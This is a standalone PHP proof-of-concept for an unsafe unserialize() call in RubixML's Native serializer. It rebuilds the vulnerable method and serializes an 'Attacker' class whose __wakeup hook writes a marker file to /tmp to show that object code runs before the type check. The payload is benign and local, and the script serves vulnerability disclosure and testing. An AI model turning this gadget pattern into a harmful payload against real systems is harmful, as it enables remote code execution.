<?php
/*
 * Standalone local PoC for RubixML Native serializer unsafe unserialize.
 * It recreates the relevant public API shape from the captured source:
 *   Rubix\ML\Serializers\Native::deserialize(Encoding $encoding)
 * directly calls unserialize($encoding) before checking Persistable type.
 *
 * No network access is used. The side effect is a local marker file in /tmp.
 */

namespace Rubix\ML {
    interface Persistable
    {
        public function revision() : string;
    }

    class Encoding implements \Stringable
    {
        protected string $data;

        public function __construct(string $data)
        {
            $this->data = $data;
        }

        public function data() : string
        {
            return $this->data;
        }

        public function __toString() : string
        {
            return $this->data;
        }
    }
}

namespace Rubix\ML\Exceptions {
    class RuntimeException extends \RuntimeException {}
}

namespace Rubix\ML\Serializers {
    use Rubix\ML\Encoding;
    use Rubix\ML\Persistable;
    use Rubix\ML\Exceptions\RuntimeException;
    use __PHP_Incomplete_Class;

    class Native
    {
        public function deserialize(Encoding $encoding) : Persistable
        {
            // Vulnerable behavior from src/Serializers/Native.php:49.
            $persistable = unserialize($encoding);

            if (!is_object($persistable)) {
                throw new RuntimeException('Deserialized data must be an object.');
            }

            if ($persistable instanceof __PHP_Incomplete_Class) {
                throw new RuntimeException('Missing class for object data.');
            }

            if (!$persistable instanceof Persistable) {
                throw new RuntimeException('Deserialized object must implement the Persistable interface.');
            }

            return $persistable;
        }
    }
}

namespace Attacker {
    class WakeupProbe
    {
        public function __wakeup(): void
        {
            file_put_contents('/tmp/rubixml_native_unserialize_triggered', 'triggered');
            echo "[side-effect] __wakeup executed during unserialize()\n";
        }
    }
}

namespace {
    use Rubix\ML\Encoding;
    use Rubix\ML\Serializers\Native;

    @unlink('/tmp/rubixml_native_unserialize_triggered');

    $payload = serialize(new \Attacker\WakeupProbe());
    echo "Payload: {$payload}\n";

    try {
        (new Native())->deserialize(new Encoding($payload));
    } catch (\Throwable $e) {
        echo "Post-deserialization check threw: " . get_class($e) . ": " . $e->getMessage() . "\n";
    }

    if (is_file('/tmp/rubixml_native_unserialize_triggered')) {
        echo "[VULNERABLE] Native::deserialize executed attacker-controlled object code before rejecting the object.\n";
        exit(0);
    }

    echo "[NOT VULNERABLE] Object wakeup side effect did not execute.\n";
    exit(1);
}
